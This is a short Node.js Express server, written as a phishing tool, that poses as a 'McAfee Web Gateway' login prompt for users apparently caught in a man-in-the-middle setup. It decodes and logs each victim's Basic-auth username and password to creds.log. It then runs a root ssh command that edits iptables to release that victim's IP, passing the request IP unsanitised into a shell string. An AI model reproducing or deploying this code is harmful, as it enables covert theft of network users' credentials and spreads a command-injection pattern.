const express = require('express');
const app = express();
const fs = require('fs');
const morgan = require('morgan');
const exec = require('child_process').exec

app.use(morgan('combined'));
app.get('/*', (req, res, next) => {
	var auth = req.headers['authorization'];
	if (!auth) {
		res
			.status(401)
			.append('WWW-Authenticate', 'Basic realm="McAfee Web Gateway"')
			.send('Authentication required.')
    } else if (auth) { 
		if (auth == 'Basic Cg==') {
			res
				.status(401)
				.append('WWW-Authenticate', 'Basic realm="McAfee Web Gateway"')
				.send('Authentication required.')
		} else {
			let creds = Buffer.from(auth.split(' ')[1],'base64').toString()
			exec(`ssh root@<> '/sbin/iptables -t nat -I MITM -s ${req.ip} -j RETURN'`, (err, req, res) => {}) 
			fs.appendFileSync('./creds.log', `${req.ip} -> ${req.headers['host']} ~ ${creds}\n`)
			fs.createReadStream('./index.html').pipe(res.status(401))
		}
	}
});app.listen(4444, x => console.log('escuchando en puerto 4444'));
